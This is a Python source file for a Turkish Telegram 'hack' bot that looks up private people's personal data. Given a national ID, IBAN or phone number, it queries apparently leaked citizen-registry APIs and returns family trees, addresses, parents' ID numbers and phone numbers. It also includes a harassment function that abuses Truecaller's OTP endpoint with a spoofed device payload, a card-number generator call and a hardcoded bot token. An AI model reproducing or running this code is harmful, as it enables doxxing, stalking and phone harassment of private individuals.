import telebot
import requests
import urllib
import time
import random
from datetime import datetime
import hashlib, random
import sqlite3
import json
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import os
from telebot import types
from io import BytesIO
import telebot
import json
import requests
from telebot import types
import time
import random
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
from io import BytesIO
from datetime import datetime
from pytz import timezone
from datetime import timedelta
import sqlite3
from bs4 import BeautifulSoup
from flask import Flask, request
import telegram
from datetime import datetime, timedelta
import threading
import pytz
import re
import os



TOKEN = "7381497791:AAEPVjVm_kOBvi0nl4Glc-aNgfEq6jCReLQ"
bot = telebot.TeleBot(TOKEN)

kanal_id =-1002028970832
grup_id =-1002028970832

print("Bot Dişxwile")

@bot.message_handler(commands=['komutlar'])
def start(message):
    
    
   

    kanal_katildi = bot.get_chat_member(kanal_id, message.from_user.id).status
    grup_katildi = bot.get_chat_member(grup_id, message.from_user.id).status
    if kanal_katildi not in ["member", "administrator", "creator"] or grup_katildi not in ["member", "administrator", "creator"]:
        parse_mode='Markdown'
        mesaj = f"komutları görmek için kanala ve chate katılmanız gerekiyor.Katıldıktan sonra /komutlar yazarak komutları görebilirsiniz."
        
        kanala_katil = telebot.types.InlineKeyboardButton("Kanala Katıl", url="https://t.me/destekbo")
        gruba_katil = telebot.types.InlineKeyboardButton("Gruba Katıl", url="https://t.me/destekbo")
        butonlar = telebot.types.InlineKeyboardMarkup()
        butonlar.row(kanala_katil, gruba_katil)
        butonlar.add()
        bot.send_message(message.chat.id, mesaj, reply_markup=butonlar)
    else:
        mesaj = "📚 Komutlar Menüsüne Hoş geldin!\n\n👪 Nüfus ve Vatandaşlık İşleri Bölümü\n\n🍀/sorgu • ad soyad tan bilgi verir\n🍀/tc • T.C den kişi bilgisi verir\n🍀/aile • T.C'den Kişi aile bilgisi verir\n🍀/sulale • T.c'den kişi sülale blgi verir\n🍀/adres  •T.C'den Kişi adresini verir\n🍀/ailepro • T.c'den aile detaylı verir\n🍀/medeni • T.c'den medeni hali verir\n🍀/tcpro • T.c'den kişi detaylı bilgi verir \n🍀/kizlik •T.c'den kişi kızlık soyad verir\n🍀/tcplaka • T.C'den plaka bilgi verir\n🍀/plaka • Plaka'dan Ceza Bilgisi Verir\n🍀/haciz • T.C'den Kişi haciz bilgi verir\n🍀/iban • IBAN'dan Kişi Bilgileri Verir\n🍀/ihbar • Adres'e ihbar Basar\n🍀/vergid  •  Kişiye ait vergi bilgi verir \n\n📱 Telefon Sorgu BÖLÜMÜ\n\n🍀/gsmtc  • GSM'den T.C Verir \n🍀/tcgsm • T.C'den GSM Verir\n🍀/sms • GSM'ye Sms Saldırısı Yapar\n🍀/arama • Telefona arama Gönderir \n🍀/operator • GSM'den Operatör Verir \n\n🎉 Eğlence BÖLÜMÜ\n\n🍀/ip • ip den konum verir\n🍀/index • URL'den site indexini verir \n🍀/yaz • Girilen Mesajı Deftere yazar\n🍀/dolar • Güncel döviz kurunu verir\n"
   
            
 
        
        butonlar = telebot.types.InlineKeyboardMarkup()
        
        bot.send_message(message.chat.id, mesaj, reply_markup=butonlar)


    
@bot.callback_query_handler(func=lambda call: call.data == "kontrol")
def kontrol(call):
    kanal_katildi = bot.get_chat_member(kanal_id, call.from_user.id).status
    grup_katildi = bot.get_chat_member(grup_id, call.from_user.id).status
    if kanal_katildi not in ["member", "administrator", "creator"] or grup_katildi not in ["member", "administrator", "creator"]:
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start(call.message)
    else:
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start(call.message)



@bot.message_handler(commands=['start'])
def start(message):
    
    
   

    kanal_katildi = bot.get_chat_member(kanal_id, message.from_user.id).status
    grup_katildi = bot.get_chat_member(grup_id, message.from_user.id).status
    if kanal_katildi not in ["member", "administrator", "creator"] or grup_katildi not in ["member", "administrator", "creator"]:
        parse_mode='Markdown'
        mesaj = f"Merhaba 👋 {message.from_user.first_name},\n\nBeni Kullanabilmek İçin ana Kanala Ve Chat Grubuna Katılmanız Gerekiyor ! \nKanala ve Chate Katılıp /start yazarak Tekrar Deneyin."
        
        kanala_katil = telebot.types.InlineKeyboardButton("Kanala Katıl", url="https://t.me/destekbo")
        gruba_katil = telebot.types.InlineKeyboardButton("Gruba Katıl", url="https://t.me/destekbo")
        butonlar = telebot.types.InlineKeyboardMarkup()
        butonlar.row(kanala_katil, gruba_katil)
        butonlar.add()
        bot.send_message(message.chat.id, mesaj, reply_markup=butonlar)
    else:
        mesaj = "👋 Merhaba! Benim adım Dijvar Hack bot sorgu yapmak için buradayım\nBeni grubunuza ekleyerek veya komutlar butonuna tıklayarak komutlarımı görebilir ve kullanabilirsiniz.\n\nEn son güncellemeler hakkında bilgi almak için @zirvebenimyerim kanalıma katılın.\n\n⛔ Not: Bot Dijvarhack  kanalına özel olarak yapılmıştır. Botu kullanmak için Dijvar Hack'e katılmanız gerekmektedir. Katıldıktan sonra çıkış yaparsanız bir daha botu kullanamazsınız."

        majeste_sohbet = telebot.types.InlineKeyboardButton("➕ Beni Grubuna Ekle", url="https://t.me/DijvarSorgu_bot?startgroup=CallToneBot")
        iletisim = telebot.types.InlineKeyboardButton("🙋owner", url="https://t.me/zirvebenimyerim")
        komutlar = telebot.types.InlineKeyboardButton("📜Komutlar", callback_data="komutlar")
        
        butonlar = telebot.types.InlineKeyboardMarkup()
        butonlar.row(komutlar)
        butonlar.row(majeste_sohbet,iletisim,)
        bot.send_message(message.chat.id, mesaj, reply_markup=butonlar)


    
@bot.callback_query_handler(func=lambda call: call.data == "kontrol")
def kontrol(call):
    kanal_katildi = bot.get_chat_member(kanal_id, call.from_user.id).status
    grup_katildi = bot.get_chat_member(grup_id, call.from_user.id).status
    if kanal_katildi not in ["member", "administrator", "creator"] or grup_katildi not in ["member", "administrator", "creator"]:
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start(call.message)
    else:
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start(call.message)



@bot.message_handler(commands=['tc'])
def tc(message):
    chat_id = message.chat.id
    if len(message.text.split()) > 1:
        tc_number = message.text.split()[1]
        url = f'http://172.208.52.218/api/legaliapi/tcpro.php?tc={tc_number}'
        response = requests.get(url)
        try:
            result = response.json()
            if result.get("success"):
                data = result['data']
            else:
                bot.send_message(chat_id, "Geçersiz TC numarası veya veri bulunamadı.")
                return
        except (KeyError, ValueError):
            bot.send_message(chat_id, "Geçersiz API yanıtı veya TC numarası bulunamadı.")
            return

        # Belirli alanları alarak düzenli bir mesaj oluştur
        formatted_message = (
            f"╔══════════════╗\n"
            f"║ Toplam: 1 Kişi.\n"
            f"║ @dijvarhack\n"
            f"╠══════════════╣\n"
            f"║ TCKN: {data.get('TC', 'Bilinmiyor')}\n"
            f"║ İsim: {data.get('ADI', 'Bilinmiyor')}\n"
            f"║ Soy İsim: {data.get('SOYADI', 'Bilinmiyor')}\n"
            f"║ Doğum Tarihi: {data.get('DOGUMTARIHI', 'Bilinmiyor')}\n"
            f"║ Nüfus İl: {data.get('NUFUSIL', 'Bilinmiyor')}\n"
            f"║ Nüfus İlçe: {data.get('NUFUSILCE', 'Bilinmiyor')}\n"
            f"║ Anne Adı: {data.get('ANNEADI', 'Bilinmiyor')}\n"
            f"║ Anne TC: {data.get('ANNETC', 'Bilinmiyor')}\n"
            f"║ Baba Adı: {data.get('BABAADI', 'Bilinmiyor')}\n"
            f"║ Baba TC: {data.get('BABATC', 'Bilinmiyor')}\n"
            f"║ GSM: {', '.join(data.get('gsm', ['Bilinmiyor']))}\n"
            f"╚══════════════╝"
        )
        bot.send_message(chat_id, formatted_message)
    else:
        bot.send_chat_action(chat_id, 'typing')
        time.sleep(2)
        bot.reply_to(message, '*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/tc 11111111110`', parse_mode='Markdown')



# WORZLYZ BABA BULUR

asa = '123456789'
gigk = ''.join(random.choice(asa) for i in range(10))
md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]

clientsecret = 'lvc22mp3l1sfv6ujg83rd17btt'
user_agent = 'Truecaller/12.34.8 (Android;8.1.2)'
accept_encoding = 'gzip'
content_length = '680'
content_type = 'application/json; charset=UTF-8'
Host = 'account-asia-south1.truecaller.com'
headers = dict(zip(('clientsecret', 'user-agent', 'accept-encoding', 'content-length', 'content-type', 'Host'), 
                   (clientsecret, user_agent, accept_encoding, content_length, content_type, Host)))

url = 'https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp'

# Kullanıcıların son komut kullanma zamanlarını saklayacak bir sözlük
last_usage = {}

def send_spam(phone_number):
    data = ('{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,'
            '"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"' + md5 + '","language":"ar",'
            '"manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android",'
            '"osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar",'
            '"sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849",'
            '"mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,'
            '"minorVersion":34}},"phoneNumber":"' + phone_number + '","region":"region-2","sequenceNo":1}')
    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        return '*Arama gönderildi.*'
    else:
        return '*Arama gönderilemedi.*'

@bot.message_handler(commands=['arama'])
def handle_arama(message):
    user_id = message.from_user.id
    current_time = datetime.now()
    
   # Kullanıcının son komut kullanım zamanı kontrol ediliyor
    if user_id in last_usage:
        last_used = last_usage[user_id]
        if current_time < last_used + timedelta(minutes=1):
            bot.send_message(message.chat.id, "*⚠️ Bu komutu sadece 1 dakikada bir kullanabilirsiniz.*", parse_mode="Markdown")
            return

    try:
        phone_number = message.text.split(' ')[1]
        if not phone_number.startswith('+'):
            raise ValueError
        result = send_spam(phone_number)
        bot.send_message(message.chat.id, result, parse_mode="Markdown")
        
           # Kullanıcının son komut kullanım zamanı güncelleniyor
        last_usage[user_id] = datetime.now()
    except IndexError:
        bot.send_message(message.chat.id, "*⚠️ Komutu yanlış kullandınız. Doğru kullanım: /arama +905555555555*", parse_mode="Markdown")
    except ValueError:
        bot.send_message(message.chat.id, "*⚠️ Lütfen geçerli bir telefon numarası girin. Örnek: /arama +905555555555*", parse_mode="Markdown")





@bot.message_handler(commands=['iban'])
def iban(message):
    chat_id = message.chat.id
    if len(message.text.split()) > 1:
        iban_number = message.text.split()[1]
        url = f'http://172.208.52.218/api/legaliapi/iban.php?iban={iban_number}'
        response = requests.get(url)
        try:
            result = response.json()
            if result:
                formatted_message = (
                    f"╔══════════════╗\n"
                    f"║ IBAN Bilgileri\n"
                    f"╠══════════════╣\n"
                    f"║ Ad: {result.get('Ad', 'Bilinmiyor')}\n"
                    f"║ Kod: {result.get('Kod', 'Bilinmiyor')}\n"
                    f"║ Swift: {result.get('Swift', 'Bilinmiyor')}\n"
                    f"║ Hesap No: {result.get('Hesap No', 'Bilinmiyor')}\n"
                    f"║ İl: {result.get('İl', 'Bilinmiyor')}\n"
                    f"║ İlçe: {result.get('İlçe', 'Bilinmiyor')}\n"
                    f"║ Tel: {result.get('Tel', 'Bilinmiyor')}\n"
                    f"║ Fax: {result.get('Fax', 'Bilinmiyor')}\n"
                    f"╚══════════════╝\n"
                    f"@zirvebenimyerim"
                )
                bot.send_message(chat_id, formatted_message)
            else:
                bot.send_message(chat_id, "Geçersiz IBAN numarası veya veri bulunamadı.")
                return
        except (KeyError, ValueError):
            bot.send_message(chat_id, "Geçersiz API yanıtı veya IBAN numarası bulunamadı.")
            return
    else:
        bot.send_chat_action(chat_id, 'typing')
        time.sleep(2)
        bot.reply_to(message, '*⚠️ Lütfen Geçerli Bir IBAN Numarası girin!\n\nÖrnek:* `/iban TR560001002247786851675002`', parse_mode='Markdown')





@bot.message_handler(commands=['aile'])
def aile(message):
    chat_id = message.chat.id
    if len(message.text.split()) > 1:
        tc_number = message.text.split()[1]
        url = f'http://172.208.52.218/api/legaliapi/ailepro.php?tc={tc_number}'
        response = requests.get(url)
        try:
            result = response.json()
            if result.get("success") == True:
                data = result['data']
                family_count = sum(len(member_group) for member_group in data)
                formatted_message = (
                    f"╔══════════════╗\n"
                    f"║ Aile Üyeleri: {family_count} Kişi.\n"
                    f"║ @dijvarhack\n"
                    f"╠══════════════╣\n"
                )

                for member_group in data:
                    for member in member_group:
                        formatted_message += (
                            f"║ Yakınlık: {member.get('Yakınlık', 'Bilinmiyor')}\n"
                            f"║ TCKN: {member.get('TC', 'Bilinmiyor')}\n"
                            f"║ İsim: {member.get('ADI', 'Bilinmiyor')}\n"
                            f"║ Soy İsim: {member.get('SOYADI', 'Bilinmiyor')}\n"
                            f"║ Doğum Tarihi: {member.get('DOGUMTARIHI', 'Bilinmiyor')}\n"
                            f"║ Nüfus İl: {member.get('NUFUSIL', 'Bilinmiyor')}\n"
                            f"║ Nüfus İlçe: {member.get('NUFUSILCE', 'Bilinmiyor')}\n"
                            f"║ Anne Adı: {member.get('ANNEADI', 'Bilinmiyor')}\n"
                            f"║ Anne TC: {member.get('ANNETC', 'Bilinmiyor')}\n"
                            f"║ Baba Adı: {member.get('BABAADI', 'Bilinmiyor')}\n"
                            f"║ Baba TC: {member.get('BABATC', 'Bilinmiyor')}\n"
                            f"║ GSM: {', '.join(member.get('gsm', ['Bilinmiyor']))}\n"
                            f"╠══════════════╣\n"
                        )
                formatted_message = formatted_message.rstrip("╠══════════════╣\n")
                formatted_message += "╚══════════════╝"
                bot.send_message(chat_id, formatted_message)
            else:
                bot.send_message(chat_id, "Geçersiz TC numarası veya veri bulunamadı.")
                return
        except (KeyError, ValueError):
            bot.send_message(chat_id, "Geçersiz API yanıtı veya TC numarası bulunamadı.")
            return
    else:
        bot.send_chat_action(chat_id, 'typing')
        time.sleep(2)
        bot.reply_to(message, '*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/aile 11111111110`', parse_mode='Markdown')




@bot.message_handler(commands=['medeni'])
def medeni(message):
    chat_id = message.chat.id
    if len(message.text.split()) > 1:
        tc_number = message.text.split()[1]
        url = f'http://172.208.52.218/api/legaliapi/medeni.php?tc={tc_number}'
        response = requests.get(url)
        try:
            result = response.json()
            if result.get("success") == "true":
                data = result['data']
                formatted_message = (
                    f"╔══════════════╗\n"
                    f"║ Medeni Hal Bilgileri\n"
                    f"╠══════════════╣\n"
                    f"║ Ad Soyad: {data.get('AdSoyad', 'Bilinmiyor')}\n"
                    f"║ Medeni Hal: {data.get('medenihal', 'Bilinmiyor')}\n"
                    f"║ GSM: {', '.join(data.get('Gsm', ['Bilinmiyor']))}\n"
                    f"╚══════════════╝\n"
                    f"@dijvarhack"
                )
                bot.send_message(chat_id, formatted_message)
            else:
                bot.send_message(chat_id, "Geçersiz TC numarası veya veri bulunamadı.")
                return
        except (KeyError, ValueError):
            bot.send_message(chat_id, "Geçersiz API yanıtı veya TC numarası bulunamadı.")
            return
    else:
        bot.send_chat_action(chat_id, 'typing')
        time.sleep(2)
        bot.reply_to(message, '*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/medeni 11111111110`', parse_mode='Markdown')



@bot.message_handler(commands=["vergid"])

def vergidairesi(message):
    
    user_id = message.from_user.id
    user_name = message.from_user.first_name
 
    
    
    try:
        tc = message.text.split()[1]
        api_url = f"http://172.208.52.218/api/legaliapi/vergid.php?tc={tc}"
        response = requests.get(api_url).json()
        
        output = f"""
╔═══════════════
╟ TC: {response["tc"]}
╟ ADI: {response["adi"]}
╟ SOYADI: {response["soyadi"]}
╟ VERGİ DAİRESİ: {response["vergi dairesi"]}
╚═══════════════
"""
        bot.send_message(message.chat.id, output)
    except IndexError:
        
        bot.send_message(message.chat.id, "⚠️*Lütfen Geçerli Bir TC Kimlik Numarası Girin*.\n\n*Örnek:* `/vergid 11111111110`", parse_mode="Markdown")
        
    except Exception as e:
        
        bot.send_message(message.chat.id, f"Data bulunamadı.")


@bot.callback_query_handler(func=lambda call: call.data == "bilgi")
def bilgi(call):
    mesaj = "hesap uretici komutlarim \n\n "
    geri = telebot.types.InlineKeyboardButton("<- Geri", callback_data="geri")
    butonlar = telebot.types.InlineKeyboardMarkup()
    butonlar.add(geri)
    bot.edit_message_text(mesaj, call.message.chat.id, call.message.message_id, reply_markup=butonlar)
@bot.message_handler(commands=['cc'])
def cc(message):
	api = requests.get('https://wizardapi.000webhostapp.com/randomccuretici.php').json()
	by = api['by']
	rcc = api['cc']
	bot.send_message(message.chat.id,f'*『CC』:*` {rcc}`\n**',parse_mode="Markdown")
	MAX_MESSAGE_LENGTH = 4096 
	
@bot.message_handler(commands=['ailepro'])
def ailepro(message):
    chat_id = message.chat.id
    if len(message.text.split()) > 1:
        tc_number = message.text.split()[1]
        url = f'https://tsgchecker.tsgmods.com.tr/yunus/aile.php?tc={tc_number}'
        response = requests.get(url)
        try:
            result = response.json()
            if result.get("success") == "true":
                data = result['data']
                total_kisi = result['number']
            else:
                bot.send_message(chat_id, "Geçersiz TC numarası veya veri bulunamadı.")
                return
        except (KeyError, ValueError):
            bot.send_message(chat_id, "Geçersiz API yanıtı veya TC numarası bulunamadı.")
            return

        formatted_message = (
            f"**╔══════════════╗\n"
            f"║ Toplam: {total_kisi} Kişi.\n"
            f"║ @dijvarhack\n"
            f"╠══════════════╣\n"
        )
        
        for kisi in data:
            formatted_message += (
                f"╠══════════════╣\n"
                f"║ Yakınlık: {kisi.get('Yakinlik', 'Bilinmiyor')}\n"
                f"║ TCKN: {kisi.get('TC', 'Bilinmiyor')}\n"
                f"║ Ad: {kisi.get('AD', 'Bilinmiyor')}\n"
                f"║ Soyad: {kisi.get('SOYAD', 'Bilinmiyor')}\n"
                f"║ GSM: {kisi.get('GSM', 'Bilinmiyor')}\n"
                f"║ Baba Adı: {kisi.get('BABAADI', 'Bilinmiyor')}\n"
                f"║ Baba TC: {kisi.get('BABATC', 'Bilinmiyor')}\n"
                f"║ Anne Adı: {kisi.get('ANNEADI', 'Bilinmiyor')}\n"
                f"║ Anne TC: {kisi.get('ANNETC', 'Bilinmiyor')}\n"
                f"║ Doğum Tarihi: {kisi.get('DOGUMTARIHI', 'Bilinmiyor')}\n"
                f"║ Ölüm Tarihi: {kisi.get('OLUMTARIHI', 'Bilinmiyor')}\n"
                f"║ Doğum Yeri: {kisi.get('DOGUMYERI', 'Bilinmiyor')}\n"
                f"║ Memleket İl: {kisi.get('MEMLEKETIL', 'Bilinmiyor')}\n"
                f"║ Memleket İlçe: {kisi.get('MEMLEKETILCE', 'Bilinmiyor')}\n"
                f"║ Memleket Köy: {kisi.get('MEMLEKETKOY', 'Bilinmiyor')}\n"
                f"║ Adres İl: {kisi.get('ADRESIL', 'Bilinmiyor')}\n"
                f"║ Adres İlçe: {kisi.get('ADRESILCE', 'Bilinmiyor')}\n"
                f"║ Aile Sıra No: {kisi.get('AILESIRANO', 'Bilinmiyor')}\n"
                f"║ Birey Sıra No: {kisi.get('BIREYSIRANO', 'Bilinmiyor')}\n"
                f"║ Medeni Hâl: {kisi.get('MEDENIHAL', 'Bilinmiyor')}\n"
                f"║ Cinsiyet: {kisi.get('CINSIYET', 'Bilinmiyor')}\n"
            )
        
        formatted_message += "╚══════════════╝**"
        bot.send_message(chat_id, formatted_message, parse_mode='Markdown')
    else:
        bot.send_chat_action(chat_id, 'typing')
        time.sleep(2)
        bot.reply_to(message, '*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/ailepro 11111111110`', parse_mode='Markdown')






@bot.message_handler(commands=['tcpro'])
def tcpro(message):
    chat_id = message.chat.id
    if len(message.text.split()) > 1:
        tc_number = message.text.split()[1]
        url = f'https://sowixapi.online/api/sowixapi/tcpro.php?tc={tc_number}'
        response = requests.get(url)
        try:
            data = response.json()['data']  # API yanıtındaki 'data' alanını al
        except (KeyError, ValueError):
            bot.send_message(chat_id, "Geçersiz API yanıtı veya TC numarası bulunamadı.")
            return

        # Belirli alanları alarak düzenli bir mesaj oluştur
        formatted_message = (
            f"╔══════════════╗\n"
            f"║ Toplam: 1 Kişi.\n"
            f"║ @dijvarhack\n"
            f"╠══════════════╣\n"
            f"║ TCKN: {data.get('TC', 'Bilinmiyor')}\n"
            f"║ İsim: {data.get('AD', 'Bilinmiyor')}\n"
            f"║ Soy İsim: {data.get('SOYAD', 'Bilinmiyor')}\n"
            f"║ Cinsiyet: {data.get('CINSIYET', 'Bilinmiyor')}\n"
            f"║ Doğum Tarihi: {data.get('DOGUMTARIHI', 'Bilinmiyor')}\n"
            f"║ Doğum Yeri: {data.get('DOGUMYERI', 'Bilinmiyor')}\n"
            f"║ Medeni Hal: {data.get('MEDENIHAL', 'Bilinmiyor')}\n"
            f"║ Nüfus İl: {data.get('MEMLEKETIL', 'Bilinmiyor')}\n"
            f"║ Nüfus İlçe: {data.get('MEMLEKETILCE', 'Bilinmiyor')}\n"
            f"║ Nüfus Köy: {data.get('MEMLEKETKOY', 'Bilinmiyor')}\n"
            f"║ Adres İl: {data.get('ADRESIL', 'Bilinmiyor')}\n"
            f"║ Adres İlçe: {data.get('ADRESILCE', 'Bilinmiyor')}\n"
            f"║ Anne Adı: {data.get('ANNEADI', 'Bilinmiyor')}\n"
            f"║ Anne TC: {data.get('ANNETC', 'Bilinmiyor')}\n"
            f"║ Baba Adı: {data.get('BABAADI', 'Bilinmiyor')}\n"
            f"║ Baba TC: {data.get('BABATC', 'Bilinmiyor')}\n"
            f"║ GSM: {data.get('GSM', 'Bilinmiyor')}\n"
            f"║ Aile Sıra No: {data.get('AILESIRANO', 'Bilinmiyor')}\n"
            f"║ Birey Sıra No: {data.get('BIREYSIRANO', 'Bilinmiyor')}\n"
            f"║ Ölüm Tarihi: {data.get('OLUMTARIHI', 'Bilinmiyor')}\n"
            f"╚══════════════╝"
        ) 
        bot.send_message(chat_id, formatted_message)
    else:
        bot.send_chat_action(chat_id, 'typing')
        time.sleep(2)
        bot.reply_to(message, '*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/tcpro 11111111110`', parse_mode='Markdown')


# Sorgulama fonksiyonu
def adres(update, context):
    chat_id = update.message.chat_id
    if len(context.args) > 0:
        tc_number = context.args[0]
        url = f'http://172.208.52.218/api/legaliapi/tc.php?tc={tc_number}'
        response = requests.get(url)
        try:
            result = response.json()
            if result.get("success"):
                data = result['data']
            else:
                context.bot.send_message(chat_id, "Geçersiz TC numarası veya veri bulunamadı.")
                return
        except (KeyError, ValueError):
            context.bot.send_message(chat_id, "Geçersiz API yanıtı veya TC numarası bulunamadı.")
            return

        # Belirli alanları alarak düzenli bir mesaj oluştur
        formatted_message = (
            f"╔══════════════╗\n"
            f"║ Toplam: 1 Kişi.\n"
            f"║ @dijvarhack\n"
            f"╠══════════════╣\n"
            f"║ TCKN: {data.get('TC', 'Bilinmiyor')}\n"
            f"║ Adı: {data.get('ADI', 'Bilinmiyor')}\n"
            f"║ Soyadı: {data.get('SOYADI', 'Bilinmiyor')}\n"
            f"║ Doğum Tarihi: {data.get('DOGUMTARIHI', 'Bilinmiyor')}\n"
            f"║ Nüfus İl: {data.get('NUFUSIL', 'Bilinmiyor')}\n"
            f"║ Nüfus İlçe: {data.get('NUFUSILCE', 'Bilinmiyor')}\n"
            f"║ Anne Adı: {data.get('ANNEADI', 'Bilinmiyor')}\n"
            f"║ Anne TC: {data.get('ANNETC', 'Bilinmiyor')}\n"
            f"║ Baba Adı: {data.get('BABAADI', 'Bilinmiyor')}\n"
            f"║ Baba TC: {data.get('BABATC', 'Bilinmiyor')}\n"
            f"║ Uyruk: {data.get('UYRUK', 'Bilinmiyor')}\n"
            f"╚══════════════╝"
        )
        context.bot.send_message(chat_id, formatted_message)
    else:
        context.bot.send_chat_action(chat_id, 'typing')
        context.bot.send_message(chat_id, '*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/adres 11111111110`', parse_mode='Markdown')




@bot.message_handler(commands=['adres'])
def adres(message):
    chat_id = message.chat.id
    if len(message.text.split()) > 1:
        tc_number = message.text.split()[1]
        url = f'https://tsgchecker.tsgmods.com.tr/yunus/adres.php?tc={tc_number}'
        response = requests.get(url)
        try:
            result = response.json()
            if result.get("success"):
                data = result['data']
            else:
                bot.send_message(chat_id, "Geçersiz TC numarası veya veri bulunamadı.")
                return
        except (KeyError, ValueError):
            bot.send_message(chat_id, "Geçersiz API yanıtı veya TC numarası bulunamadı.")
            return

        # Belirli alanları alarak düzenli bir mesaj oluştur
        formatted_message = (
            f"╔══════════════╗\n"
            f"║ Toplam: 1 Kişi.\n"
            f"║ @dijvarhack\n"
            f"╠══════════════╣\n"
            f"║ TCKN: {data.get('TC', 'Bilinmiyor')}\n"
            f"║ Ad Soyad: {data.get('ADSOYAD', 'Bilinmiyor')}\n"
            f"║ Doğum Yeri: {data.get('DOGUMYERI', 'Bilinmiyor')}\n"
            f"║ Vergi No: {data.get('VERGINO', 'Bilinmiyor')}\n"
            f"║ Adres: {data.get('ADRES', 'Bilinmiyor')}\n"
            f"╚══════════════╝"
        )
        bot.send_message(chat_id, formatted_message)
    else:
        bot.send_chat_action(chat_id, 'typing')
        time.sleep(2)
        bot.reply_to(message, '*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/adres 11111111110`', parse_mode='Markdown')



# IP adresi kontrolü için regex
IP_REGEX = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')

@bot.message_handler(commands=['ip'])
def ip(message):
    try:
        ip = message.text.split(' ')[1]
        # IP adresinin geçerli olup olmadığını kontrol et
        if not IP_REGEX.match(ip):
            bot.send_message(message.chat.id, "*⚠️ Lütfen Geçerli Bir IP adresi belirtin!*\n\n*Örnek:* `/ip 8.8.8.8`", parse_mode="Markdown")
            return
        
        user_id = message.from_user.id
        user_name = message.from_user.first_name
        username = message.from_user.username

        response_message = f'''
sorgulanıyor bekleyiniz
'''
        bot.send_message(message.chat.id, response_message)

        response = requests.get(f"http://ip-api.com/json/{ip}").json()
        if response["status"] == "success":
            response_message = f'''
╭━━━━━━━━━━━━━╮
┃➥ @alexhex1
┃━━━━━━━━━━━━━━
┃➥ IP: {response['query'] or 'Bulunamadı'}
┃➥ Ülke: {response['country']} - {response['countryCode'] or 'Bulunamadı'}
┃➥ Şehir : {response['regionName'] or 'Bulunamadı'}
┃➥ İlçe: {response["city"] or 'Bulunamadı'}
┃➥ Posta Kodu: {response["zip"] or 'Bulunamadı'}
┃➥ Operatör: {response["isp"] or 'Bulunamadı'}
┃➥ Zaman Türü: {response["timezone"] or 'Bulunamadı'}
┃➥ Koordinatlar: {response["lat"] or 'Bulunamadı'}
╰━━━━━━━━━━━━━╯'''
            bot.send_message(message.chat.id, response_message)

            log_message = f"Yeni IP Adresi Sorgulandı!\n" \
                          f"Sorgulanan IP: {ip}\n" \
                          f"Sorgulayan ID: {user_id}\n" \
                          f"Sorgulayan Adı: {user_name}\n" \
                          f"Sorgulayan K. Adı: @{username}"
            
            bot.send_message(message.chat.id, " Başarıyla sorgulandı ✅")
    except IndexError:
        bot.send_message(message.chat.id,
        "*⚠️ Lütfen Geçerli Bir IP adresi belirtin!*\n\n*Örnek:* `/ip 8.8.8.8`", parse_mode="Markdown")



	
@bot.message_handler(commands=['ip'])
def ip(message):
    try:
        ip = message.text.split(' ')[1]
        user_id = message.from_user.id
        user_name = message.from_user.first_name
        username = message.from_user.username

        response_message = f'''
sorgulanıyor bekleyiniz
'''
        bot.send_message(message.chat.id, response_message)

        response = requests.get(f"http://ip-api.com/json/{ip}").json()
        if response["status"] == "success":
            response_message = f'''
╭━━━━━━━━━━━━━╮
┃➥ @alexhex1
┃━━━━━━━━━━━━━━
┃➥ IP: {response['query'] or 'Bulunamadı'}
┃➥ Ülke: {response['country']} - {response['countryCode'] or 'Bulunamadı'}
┃➥ Şehir : {response['regionName'] or 'Bulunamadı'}
┃➥ İlçe: {response["city"] or 'Bulunamadı'}
┃➥ Posta Kodu: {response["zip"] or 'Bulunamadı'}
┃➥ Operatör: {response["isp"] or 'Bulunamadı'}
┃➥ Zaman Türü: {response["timezone"] or 'Bulunamadı'}
┃➥ Koordinatlar: {response["lat"] or 'Bulunamadı'}
╰━━━━━━━━━━━━━╯'''
            bot.send_message(message.chat.id, response_message)

            log_message = f"Yeni IP Adresi Sorgulandı!\n" \
                          f"Sorgulanan IP: {ip}\n" \
                          f"Sorgulayan ID: {user_id}\n" \
                          f"Sorgulayan Adı: {user_name}\n" \
                          f"Sorgulayan K. Adı: @{username}"
            
            bot.send_message(message.chat.id, " Başarıyla sorgulandı ✅")
    except IndexError:
        bot.send_message(message.chat.id,
        "*⚠️ Lütfen Geçerli Bir ip adresi belirtin!*\n\n*Örnek:* `/ip 8.8.8.8`", parse_mode="Markdown")
                                                   

                                                              

# GSM detaylarını çekmek için API'ye istek gönderen fonksiyon
def get_gsm_details(tc_number):
    url = f"http://172.208.52.218/api/legaliapi/tcgsm.php?tc={tc_number}"
    response = requests.get(url)
    data = response.json()
    return data

# /tcgsm komutunu işleyen fonksiyon
@bot.message_handler(commands=['tcgsm'])
def gsmdetay(message):
    # Komutun doğru kullanımını kontrol et
    tc = message.text.split()[1] if len(message.text.split()) > 1 else None

    if not tc:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
